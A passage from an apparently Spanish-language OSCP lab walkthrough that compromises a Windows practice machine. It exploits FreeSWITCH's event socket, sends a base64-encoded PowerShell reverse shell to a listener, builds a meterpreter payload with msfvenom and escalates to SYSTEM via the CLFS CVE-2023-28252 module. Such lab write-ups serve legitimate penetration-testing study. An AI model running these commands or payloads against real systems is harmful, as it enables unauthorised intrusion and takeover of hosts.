| **3389/tcp** | open   | ms-wbt-server    | Microsoft Terminal Services (RDP)<br>• Certificado CN=OSCP, válido: 13-08-2025 → 12-02-2026<br>• NTLM Info:<br> - Target Name: OSCP<br> - NetBIOS Domain: OSCP<br> - NetBIOS Computer: OSCP<br> - DNS Domain: OSCP<br> - DNS Computer: OSCP<br> - Product Version: 10.0.19041 |
| **8021/tcp** | open   | freeswitch-event | FreeSWITCH mod\_event\_socket                                                                                                                                                                                                                                                 |

#### Exploramos el freeswitch-event

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# searchsploit "FreeSWITCH"              
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
FreeSWITCH - Event Socket Command Execution (Metasploit)                                                                                                                        | multiple/remote/47698.rb
FreeSWITCH 1.10.1 - Command Execution                                                                                                                                           | windows/remote/47799.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# searchsploit -m 47799
  Exploit: FreeSWITCH 1.10.1 - Command Execution
      URL: https://www.exploit-db.com/exploits/47799
     Path: /usr/share/exploitdb/exploits/windows/remote/47799.txt
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/OffSec/Challenges/5_OSCP-B/Standalone-Machines/Gust/47799.txt
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# mv 47799.txt 47799.py
```

#### Ejecutamos el exploit

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# python3 47799.py 192.168.193.151 whoami
Authenticated
Content-Type: api/response
Content-Length: 11

oscp\chris
```

#### Obtenemos un reverse shell

1. Ejecucion

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# python3 47799.py 192.168.193.151 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQAyACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
Authenticated
```

2. Receptor

```bash
┌──(root㉿kali)-[/home/…/Challenges/5_OSCP-B/Standalone-Machines/Gust]
└─# nc -lvnp 4444                          
listening on [any] 4444 ...
connect to [192.168.45.152] from (UNKNOWN) [192.168.193.151] 51432
whoami
oscp\chris
PS C:\Program Files\FreeSWITCH> 
```

#### Enumeramos

```powershell
PS C:\Program Files\FreeSWITCH> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
PS C:\Program Files\FreeSWITCH> Get-Service -Name spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  spooler            Print Spooler                         


PS C:\Program Files\FreeSWITCH> Start-Service -Name spooler
PS C:\Program Files\FreeSWITCH> Get-Service -Name spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  spooler            Print Spooler                         


PS C:\Program Files\FreeSWITCH> 
```

#### Obtenemos el flag local

```powershell
PS C:\Program Files\FreeSWITCH> cd C:\Users
PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        11/28/2022   1:24 AM                Administrator                                                        
d-----        11/28/2022   1:25 AM                chris                                                                
d-r---        11/18/2020  11:48 PM                Public                                                               


PS C:\Users> cd chris
PS C:\Users\chris> dir


    Directory: C:\Users\chris


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---        10/31/2022   1:51 PM                3D Objects                                                           
d-r---        10/31/2022   1:51 PM                Contacts                                                             
d-r---        10/31/2022   3:45 PM                Desktop                                                              
d-r---        10/31/2022   1:51 PM                Documents                                                            
d-r---        10/31/2022   1:51 PM                Downloads                                                            
d-r---        10/31/2022   1:51 PM                Favorites                                                            
d-r---        10/31/2022   1:51 PM                Links                                                                
d-r---        10/31/2022   1:51 PM                Music                                                                
d-r---        10/31/2022   1:57 PM                OneDrive                                                             
d-r---        10/31/2022   1:53 PM                Pictures                                                             
d-r---        10/31/2022   1:51 PM                Saved Games                                                          
d-r---        10/31/2022   1:53 PM                Searches                                                             
d-r---        10/31/2022   1:51 PM                Videos                                                               


PS C:\Users\chris> cd Desktop
PS C:\Users\chris\Desktop> dir


    Directory: C:\Users\chris\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         8/26/2025   6:03 AM             34 local.txt                                                            


PS C:\Users\chris\Desktop> type local.txt
d7338ddaafe0e216ad033b9ebeca2e0d
PS C:\Users\chris\Desktop> 
```

#### Generamos payload para session meterpreter

```bash
┌──(root㉿kali)-[/home/kali]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.152 LPORT=4445 -f exe -o met.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: met.exe
```

#### Obtenemos session meterpreter

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > options

Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 192.168.45.152
LHOST => 192.168.45.152
msf6 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.152:4445 
msf6 exploit(multi/handler) > [*] Sending stage (203846 bytes) to 192.168.193.151
[*] Meterpreter session 1 opened (192.168.45.152:4445 -> 192.168.193.151:51526) at 2025-08-26 10:55:26 -0300
sessions

Active sessions
===============

  Id  Name  Type                     Information        Connection
  --  ----  ----                     -----------        ----------
  1         meterpreter x64/windows  OSCP\chris @ OSCP  192.168.45.152:4445 -> 192.168.193.151:51526 (192.168.193.151)

msf6 exploit(multi/handler) > 
```

#### Elevamos privilegios 

```bash
msf6 exploit(multi/handler) > search type:post suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use 0
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.193.151 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.193.151 - 203 exploit checks are being tried...
[+] 192.168.193.151 - exploit/windows/local/bits_ntlm_token_impersonation: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 192.168.193.151 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default
[+] 192.168.193.151 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 10 version 21H1
[+] 192.168.193.151 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.193.151 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 192.168.193.151 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bits_ntlm_token_impersonation            Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default                                                                                                                                                                               
 8   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows 10 version 21H1
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.

[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > options

Module options (exploit/windows/local/cve_2023_28252_clfs_driver):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.5      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x64



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.152
LHOST => 192.168.45.152
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 4446
LPORT => 4446
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.45.152:4446 
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > [*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.19043.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching msiexec to host the DLL...
[+] Process 6280 launched.
[*] Reflectively injecting the DLL into 6280...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.193.151
[*] Meterpreter session 2 opened (192.168.45.152:4446 -> 192.168.193.151:51573) at 2025-08-26 11:01:49 -0300
sessions

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x64/windows  OSCP\chris @ OSCP           192.168.45.152:4445 -> 192.168.193.151:51526 (192.168.193.151)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ OSCP  192.168.45.152:4446 -> 192.168.193.151:51573 (192.168.193.151)

msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > shell
Process 1464 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19043.2130]
(c) Microsoft Corporation. All rights reserved.

C:\Users\chris\Documents>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
539bfeb9919842d51ab40ff64be9a7d0
```
